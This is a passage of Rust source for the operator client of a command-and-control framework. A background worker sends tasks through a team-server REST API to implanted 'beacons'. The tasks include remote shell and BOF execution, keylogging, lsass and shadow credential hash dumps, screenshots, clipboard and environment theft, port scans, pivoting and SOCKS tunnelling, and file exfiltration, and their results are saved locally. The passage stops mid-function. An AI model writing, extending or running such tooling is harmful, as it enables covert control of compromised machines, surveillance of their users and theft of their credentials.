//! Async REST client + background worker that mirrors the GUI bridge pattern.
//!
//! The TUI thread must never block on IO. We spawn one OS thread owning a
//! `current_thread` tokio runtime running `worker_loop`. It talks to the TUI
//! over two `std::sync::mpsc` channels: `Snapshot`s flow worker→UI, `Cmd`s flow
//! UI→worker. The TUI redraws only when a snapshot arrives or input changes.

use std::sync::mpsc::{self, Receiver, Sender};
use std::time::{Duration, Instant};

use crate::parse::{self};
use crate::types::{CredEntry, FileEntry, ProcEntry, ResultView, SessionView, TaskAck};

/// Default poll interval for the session list.
const SESSION_POLL: Duration = Duration::from_secs(2);
/// Per-task result-poll backoff: starts here, doubles, caps at 4s.
const TASK_BACKOFF_START: Duration = Duration::from_millis(500);
const TASK_BACKOFF_CAP: Duration = Duration::from_secs(4);
/// Cap on the worker's pending log buffer (mirrors the GUI's H2-DoS guard).
const LOG_BUFFER_CAP: usize = 2048;
/// Max wall-clock time to wait for a task result before giving up. Downloads are
/// exempt (they stream chunks and set their own `eof`). A task older than this
/// is dropped from the pending queue and logged as timed out — prevents a slow
/// or dead beacon from filling the queue forever.
const TASK_DEADLINE: Duration = Duration::from_secs(60);

// ---- messages on the channels ----

/// worker→UI push. Coarse-grained: only sent when something changed.
pub struct Snapshot {
    /// New/changed session list. Empty if the worker had nothing new to report
    /// this cycle (e.g. only log lines arrived).
    pub sessions: Vec<SessionView>,
    /// Log lines accumulated since the last snapshot.
    pub log_lines: Vec<LogLine>,
    /// Whether the server is reachable right now.
    pub connected: bool,
    /// A parsed table to pop as a fullscreen overlay, if a /ls /ps /creds task
    /// just completed. At most one per snapshot (the most recent).
    pub parsed: Option<ParsedTable>,
}

/// One parsed table ready for the fullscreen overlay.
pub enum ParsedTable {
    Files(Vec<FileEntry>),
    Procs(Vec<ProcEntry>),
    Creds(Vec<CredEntry>),
}

/// How (if at all) a shell task's output should be parsed before routing.
#[derive(Clone, Copy, PartialEq, Eq)]
pub enum ParseAs {
    None,
    Files,
    Procs,
    Creds,
}

/// One coloured log line for the event stream.
#[derive(Clone)]
pub struct LogLine {
    pub text: String,
    pub level: Level,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum Level {
    Info,
    Ok,
    Warn,
    Err,
}

/// UI→worker command.
pub enum Cmd {
    /// Set/switch the team server target. `(url, optional bearer)`.
    Connect(String, Option<String>),
    /// Run a shell command on the selected session. `parse` tells the worker to
    /// route the parsed output to the fullscreen overlay instead of the log.
    Shell { session: String, args: String, parse: ParseAs },
    /// Run a BOF on the selected session.
    Bof { session: String, name: String, args: String, data_hex: String },
    /// Upload a file (name + hex bytes).
    Upload { session: String, name: String, data_hex: String },
    /// Download a file; chunks stream back as log lines + saved bytes.
    Download { session: String, path: String, local: Option<String> },
    /// Task the beacon to exit (`{"type":"exit"}`).
    Exit { session: String },
    /// Set the beacon's beacon interval (and optional jitter %).
    Sleep { session: String, seconds: u32, jitter_pct: u8 },
    /// Liveness probe (`{"type":"ping"}`); an `ok` result confirms the beacon
    /// is still alive.
    Ping { session: String },
    /// 文件系统操作（cd/mkdir/rm/mv/cp）。
    FileOp { session: String, op: String, path: String, dest: Option<String> },
    /// 从 implant 发起出站连接（P2P / rportfwd）。chan 由 server 分配。
    Pivot { session: String, host: String, port: u16 },
    /// SOCKS5 中继控制。
    Socks { session: String, chan: u32, op: u8, addr: String, port: u16 },
    /// 截屏。
    Screenshot { session: String, monitor: u8 },
    /// 端口扫描。
    Portscan { session: String, host: String, ports: String },
    /// 网络信息收集。
    Net { session: String, query: String },
    /// 磁盘信息。
    DriveInfo { session: String },
    /// 剪贴板。
    Clipboard { session: String },
    /// 环境变量。
    Env { session: String, name: String },
    /// 键盘记录。action 0=start 1=stop 2=dump。
    Keylog { session: String, action: u8 },
    /// 持续截屏。
    Screenwatch { session: String, interval_secs: u32 },
    /// 凭据哈希提取。method 0=lsass 1=shadow。
    Hashdump { session: String, method: u8 },
    /// Stop the worker thread.
    Shutdown,
}

/// Handle the TUI holds to talk to the worker.
pub struct Bridge {
    /// Drain snapshots in the render loop (non-blocking `try_recv`).
    pub snapshots: Receiver<Snapshot>,
    /// Send commands on key actions.
    pub cmds: Sender<Cmd>,
}

/// Spawn the background IO worker. Returns the channel ends the TUI holds.
///
/// Auto-connects to the given server immediately (so the TUI doesn't need a
/// separate connect step for the common case of launching with `--server`).
pub fn spawn(server: String, token: Option<String>) -> Bridge {
    let (snap_tx, snap_rx) = mpsc::channel::<Snapshot>();
    let (cmd_tx, cmd_rx) = mpsc::channel::<Cmd>();
    std::thread::spawn(move || {
        let rt = match tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
        {
            Ok(rt) => rt,
            Err(e) => {
                let _ = snap_tx.send(Snapshot {
                    sessions: Vec::new(),
                    log_lines: vec![LogLine {
                        text: format!("runtime build failed: {e}"),
                        level: Level::Err,
                    }],
                    connected: false,
                    parsed: None,
                });
                return;
            }
        };
        rt.block_on(worker_loop(cmd_rx, snap_tx, server, token));
    });
    Bridge {
        snapshots: snap_rx,
        cmds: cmd_tx,
    }
}

/// What a pending task is, so its result can be routed correctly.
#[derive(Clone)]
enum TaskKind {
    Shell(ParseAs),
    Bof { name: String },
    Download { path: String, local: Option<String> },
    /// 截屏：结果以 FileChunk 分块返回，保存到 downloads/screenshot-<taskid>.png
    Screenshot,
    /// A ping; an `ok` result confirms the beacon is alive.
    Ping,
}

struct PendingTask {
    session: String,
    task_id: u64,
    kind: TaskKind,
    backoff: Duration,
    last_poll: Instant,
    /// When the task was first enqueued — used for the overall deadline.
    started_at: Instant,
    /// Accumulated file chunks for downloads.
    chunks: Vec<(u32, Vec<u8>)>,
    saw_eof: bool,
}

async fn worker_loop(
    cmd_rx: Receiver<Cmd>,
    snap_tx: Sender<Snapshot>,
    initial_server: String,
    initial_token: Option<String>,
) {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .build()
        .expect("reqwest client build");
    let mut server: Option<(String, Option<String>)> =
        Some((initial_server, initial_token));

    let mut pending: Vec<PendingTask> = Vec::new();
    let mut log_buf: Vec<LogLine> = Vec::new();
    // A parsed table waiting to be flushed in the next snapshot. Set when a
    // /ls /ps /creds task completes; cleared once pushed.
    let mut parsed_buf: Option<ParsedTable> = None;
    let mut last_session_sig = String::new();
    let mut was_connected = false;

    loop {
        // 1. Drain UI→worker commands (non-blocking).
        let mut connect_changed = false;
        while let Ok(cmd) = cmd_rx.try_recv() {
            match cmd {
                Cmd::Shutdown => return,
                Cmd::Connect(s, t) => {
                    log_push(&mut log_buf, &format!("connecting to {s} …"), Level::Info);
                    server = Some((s, t));
                    connect_changed = true;
                }
                Cmd::Shell { session, args, parse } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_shell(&client, srv, &session, &args, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] $ {} → task {}", short(&session), args, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session, task_id: tid, kind: TaskKind::Shell(parse),
                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(), saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Bof { session, name, args, data_hex } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_bof(&client, srv, &session, &name, &args, &data_hex, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] bof {} → task {}", short(&session), name, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session, task_id: tid, kind: TaskKind::Bof { name },
                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(), saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! bof enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Upload { session, name, data_hex } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_upload(&client, srv, &session, &name, &data_hex, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] upload {} → task {}", short(&session), name, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session, task_id: tid, kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(), saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! upload enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Download { session, path, local } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_download(&client, srv, &session, &path, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] download {} → task {}", short(&session), path, tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session, task_id: tid,
                                kind: TaskKind::Download { path, local },
                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(), saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! download enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Sleep { session, seconds, jitter_pct } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_sleep(&client, srv, &session, seconds, jitter_pct, tok).await {
                        Ok(tid) => log_push(
                            &mut log_buf,
                            &format!("[{}] sleep {seconds}s (±{jitter_pct}%) → task {}", short(&session), tid),
                            Level::Info,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! sleep enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Ping { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_ping(&client, srv, &session, tok).await {
                        Ok(tid) => {
                            pending.push(PendingTask {
                                session: session.clone(), task_id: tid,
                                kind: TaskKind::Ping,
                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(), saw_eof: false,
                            });
                            log_push(
                                &mut log_buf,
                                &format!("[{}] ping → task {}", short(&session), tid),
                                Level::Info,
                            );
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! ping enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Exit { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_exit(&client, srv, &session, tok).await {
                        Ok(()) => log_push(
                            &mut log_buf,
                            &format!("[{}] tasked exit", short(&session)),
                            Level::Warn,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! exit: {e}"), Level::Err),
                    }
                }
                Cmd::FileOp { session, op, path, dest } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_fileop(&client, srv, &session, &op, &path, dest.as_deref(), tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] {op} {path} → task {}", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session, task_id: tid, kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(), saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! fileop enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Pivot { session, host, port } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_pivot(&client, srv, &session, &host, port, tok).await {
                        Ok((tid, chan)) => {
                            let chan_msg = match chan {
                                Some(c) => format!(" chan={c} (use /socks {c} ...)"),
                                None => String::new(),
                            };
                            log_push(
                                &mut log_buf,
                                &format!("[{}] pivot → {host}:{port} (task {}){chan_msg}", short(&session), tid),
                                Level::Info,
                            );
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! pivot enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Socks { session, chan, op, addr, port } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_socks(&client, srv, &session, chan, op, &addr, port, tok).await {
                        Ok(tid) => log_push(
                            &mut log_buf,
                            &format!("[{}] socks chan {chan} {addr}:{port} (task {})", short(&session), tid),
                            Level::Info,
                        ),
                        Err(e) => log_push(&mut log_buf, &format!("! socks enqueue: {e}"), Level::Err),
                    }
                }
                Cmd::Screenshot { session, monitor } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "screenshot", "monitor": monitor });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] screenshot monitor {monitor} (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Screenshot, backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! screenshot: {e}"), Level::Err),
                    }
                }
                Cmd::Portscan { session, host, ports } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "portscan", "host": host, "ports": ports });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] portscan {host} {ports} (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! portscan: {e}"), Level::Err),
                    }
                }
                Cmd::Net { session, query } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "net", "query": query });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] net {query} (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! net: {e}"), Level::Err),
                    }
                }
                Cmd::DriveInfo { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let command = serde_json::json!({ "type": "driveinfo" });
                    match enqueue_simple(&client, srv, &session, command, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] driveinfo (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! driveinfo: {e}"), Level::Err),
                    }
                }
                Cmd::Clipboard { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let command = serde_json::json!({ "type": "clipboard" });
                    match enqueue_simple(&client, srv, &session, command, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] clipboard (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! clipboard: {e}"), Level::Err),
                    }
                }
                Cmd::Env { session, name } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "env", "name": name });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] env {name} (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! env: {e}"), Level::Err),
                    }
                }
                Cmd::Keylog { session, action } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "keylog", "action": action });
                    let label = match action { 0 => "start", 1 => "stop", _ => "dump" };
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] keylog {label} (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! keylog: {e}"), Level::Err),
                    }
                }
                Cmd::Screenwatch { session, interval_secs } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "screenwatch", "interval_secs": interval_secs });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] screenwatch {interval_secs}s (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Screenshot, backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! screenwatch: {e}"), Level::Err),
                    }
                }
                Cmd::Hashdump { session, method } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
                    };
                    let cmd = serde_json::json!({ "type": "hashdump", "method": method });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(&mut log_buf, &format!("[{}] hashdump (task {})", short(&session), tid), Level::Info);
                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Shell(ParseAs::None), backoff: TASK_BACKOFF_START, last_poll: Instant::now(), started_at: Instant::now(), chunks: Vec::new(), saw_eof: false });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}"), Level::Err),
                    }
                }
            }
        }

        let Some((ref srv, ref token)) = server else {
            tokio::time::sleep(Duration::from_millis(200)).await;
            continue;
        };

        // 2. Refresh session list (throttled).
        match fetch_sessions(&client, srv, token).await {
            Ok(list) => {
                let sig = session_signature(&list);
                let changed = sig != last_session_sig || connect_changed;
                let connected_changed = !was_connected || connect_changed;
                was_connected = true;
                if changed {
                    last_session_sig = sig;
                }
                if changed || connected_changed || !log_buf.is_empty() || parsed_buf.is_some() {
                    let _ = snap_tx.send(Snapshot {
                        sessions: if changed { list.clone() } else { Vec::new() },
                        log_lines: std::mem::take(&mut log_buf),
                        connected: true,
                        parsed: parsed_buf.take(),
                    });
                }
            }
            Err(e) => {
                was_connected = false;
                log_push(&mut log_buf, &format!("! sessions: {e}"), Level::Err);
                let _ = snap_tx.send(Snapshot {
                    sessions: Vec::new(),
                    log_lines: std::mem::take(&mut log_buf),
                    connected: false,
                    parsed: None,
                });
            }
        }

        // 3. Poll pending tasks (with per-task backoff + overall deadline).
        let mut still_pending = Vec::new();
        for mut t in pending.drain(..) {
            if t.last_poll.elapsed() < t.backoff {
                still_pending.push(t);
                continue;
            }
            // Chunked tasks (downloads + screenshots) stream FileChunks + eof.
            let is_chunked = matches!(t.kind, TaskKind::Download { .. } | TaskKind::Screenshot);
            if !is_chunked && t.started_at.elapsed() > TASK_DEADLINE {
                log_push(
                    &mut log_buf,
                    &format!("[{}] task {} timed out (>{:?}) — dropped",
                             short(&t.session), t.task_id, TASK_DEADLINE),
                    Level::Warn,
                );
                continue;
            }
            // Chunked tasks need the full result stream, others a single row.
            let res = if is_chunked {
                poll_file_chunks(&client, srv, &t.session, t.task_id, &mut t.chunks, &mut t.saw_eof, token).await
            } else {
                poll_result(&client, srv, &t.session, t.task_id, token).await
            };
            match res {
                PollOutcome::Done(out) => {
                    route_result(&mut log_buf, &mut parsed_buf, &t, out);
                    if is_chunked {
                        finish_chunked(&mut log_buf, &t);
                    }
                }
                PollOutcome::Pending => {
                    t.backoff = (t.backoff * 2).min(TASK_BACKOFF_CAP);
                    t.last_poll = Instant::now();
                    still_pending.push(t);
                }
                PollOutcome::Err(e) => {
                    log_push(&mut log_buf, &format!("[{}] ! {}", short(&t.session), e), Level::Err);
                }
            }
        }
        pending = still_pending;

        if !log_buf.is_empty() || parsed_buf.is_some() {
            let _ = snap_tx.send(Snapshot {
                sessions: Vec::new(),
                log_lines: std::mem::take(&mut log_buf),
                connected: true,
                parsed: parsed_buf.take(),
            });
        }

        tokio::time::sleep(SESSION_POLL).await;
    }
}

enum PollOutcome {
    Done(Option<String>),
    Pending,
    Err(String),
}

fn route_result(
    log_buf: &mut Vec<LogLine>,
    parsed_buf: &mut Option<ParsedTable>,
    t: &PendingTask,
    out: Option<String>,
) {
    let out = match out {
        Some(o) => o,
        None => {
            log_push(log_buf, &format!("[{}] (task {} no output)", short(&t.session), t.task_id), Level::Warn);
            return;
        }
    };
    match &t.kind {
        TaskKind::Shell(parse) => {
            match parse {
                ParseAs::None => {
                    for line in out.lines() {
                        log_push(log_buf, line, Level::Info);
                    }
                }
                ParseAs::Files => {
                    let rows = parse::parse_any_files(&out);
                    *parsed_buf = Some(ParsedTable::Files(rows));
                }
                ParseAs::Procs => {
                    let rows = parse::parse_any_procs(&out);
                    *parsed_buf = Some(ParsedTable::Procs(rows));
                }
                ParseAs::Creds => {
                    let rows = parse::parse_creds(&out);
                    *parsed_buf = Some(ParsedTable::Creds(rows));
                }
            }
        }
        TaskKind::Bof { name } => {
            for line in out.lines() {
                log_push(log_buf, &format!("[{}] bof {}: {}", short(&t.session), name, line), Level::Info);
            }
        }
        TaskKind::Download { .. } | TaskKind::Screenshot => {
            // handled by finish_chunked (分块重组 + 落盘)
        }
        TaskKind::Ping => {
            // An `ok` result surfaces here as the empty string; anything else is
            // treated as the beacon's response. Empty ⟺ alive.
            if out.trim().is_empty() {
                log_push(log_buf, &format!("[{}] ping: alive", short(&t.session)), Level::Ok);
            } else {
                log_push(log_buf, &format!("[{}] ping: {}", short(&t.session), out.trim()), Level::Info);
            }
        }
    }
}

fn finish_chunked(log_buf: &mut Vec<LogLine>, t: &PendingTask) {
    // 重组分块数据
    let mut chunks = t.chunks.clone();
    chunks.sort_by_key(|(s, _)| *s);
    let mut out = Vec::new();
    for (_, d) in chunks {
        out.extend(d);
    }
    // 根据 task kind 决定保存路径和日志消息
    let (save_path, log_msg) = match &t.kind {
        TaskKind::Download { path, local } => {
            let sp = match local {
                Some(l) if !l.trim().is_empty() => l.clone(),
                _ => {
                    let basename = path.rsplit(['/', '\\']).next().unwrap_or(path);
                    format!("downloads/{basename}")
                }
            };
            (sp, format!("downloaded {} ({} bytes)", path, out.len()))
        }
        TaskKind::Screenshot => {
            let sp = format!("downloads/screenshot-{}.png", t.task_id);
            (sp, format!("screenshot saved ({} bytes)", out.len()))
        }
        _ => return,
    };
    if let Some(parent) = std::path::Path::new(&save_path).parent() {
        if !parent.as_os_str().is_empty() {
            let _ = std::fs::create_dir_all(parent);
        }
    }
    if let Err(e) = std::fs::write(&save_path, &out) {
        log_push(log_buf, &format!("[{}] ! save {save_path}: {e}", short(&t.session)), Level::Err);
        return;
    }
    log_push(
        log_buf,
        &format!("[{}] {} -> {save_path}", short(&t.session), log_msg),
        Level::Ok,
    );
}

// ---- async REST helpers (all on the worker) ----

fn authed(req: reqwest::RequestBuilder, token: &Option<String>) -> reqwest::RequestBuilder {
    match token {
        Some(t) => req.bearer_auth(t),
        None => req,
    }
}

async fn fetch_sessions(
    c: &reqwest::Client,
    server: &str,
    token: &Option<String>,
) -> anyhow::Result<Vec<SessionView>> {
    Ok(authed(c.get(format!("{server}/api/sessions")), token)
        .send()
        .await?
        .json()
        .await?)
}

async fn enqueue_shell(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    args: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({ "session": session, "command": { "type": "shell", "args": args } });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

async fn enqueue_bof(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    name: &str,
    args: &str,
    data_hex: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let args_vec: Vec<&str> = if args.trim().is_empty() {
        Vec::new()
    } else {
        args.split_whitespace().collect()
    };
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "bof", "name": name, "args": args_vec, "data_hex": data_hex }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

async fn enqueue_upload(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    name: &str,
    data_hex: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "upload", "name": name, "data_hex": data_hex }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

async fn enqueue_download(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    path: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session, "command": { "type": "download", "path": path }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

/// Task a beacon to exit. Fire-and-forget (we don't poll its result).
async fn enqueue_exit(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    token: &Option<String>,
) -> anyhow::Result<()> {
    let body = serde_json::json!({ "session": session, "command": { "type": "exit" } });
    let _ = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?;
    Ok(())
}

/// Set the beacon's beacon interval (and optional jitter %).
async fn enqueue_sleep(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    seconds: u32,
    jitter_pct: u8,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "sleep", "seconds": seconds, "jitter_pct": jitter_pct }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

/// Liveness probe. Returns the task id; an `ok` result confirms alive.
async fn enqueue_ping(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({ "session": session, "command": { "type": "ping" } });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

/// 文件系统操作（cd/mkdir/rm/mv/cp）。
async fn enqueue_fileop(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    op: &str,
    path: &str,
    dest: Option<&str>,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "fileop", "op": op, "path": path, "dest": dest }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

/// 从 implant 发起出站连接（P2P / rportfwd）。
async fn enqueue_pivot(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    host: &str,
    port: u16,
    token: &Option<String>,
) -> anyhow::Result<(u64, Option<u32>)> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "connect", "host": host, "port": port }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok((ack.task_id, ack.chan))
}

/// SOCKS5 中继控制。
#[allow(clippy::too_many_arguments)]
async fn enqueue_socks(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    chan: u32,
    op: u8,
    addr: &str,
    port: u16,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "socks", "chan": chan, "op": op, "addr": addr, "port": port }
    });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

/// 通用单任务入队（command body 直接传 JSON value）。用于简单命令避免重复代码。
async fn enqueue_simple(
    c: &reqwest::Client,
    server: &str,
    session: &str,
    command: serde_json::Value,
    token: &Option<String>,
) -> anyhow::Result<u64> {
    let body = serde_json::json!({ "session": session, "command": command });
    let ack: TaskAck = authed(c.post(format!("{server}/api/task")).json(&body), token)
        .send().await?.json().await?;
    Ok(ack.task_id)
}

async fn fetch_results(
    c: &reqwest::Client,
    server: &str,
    session: &str,
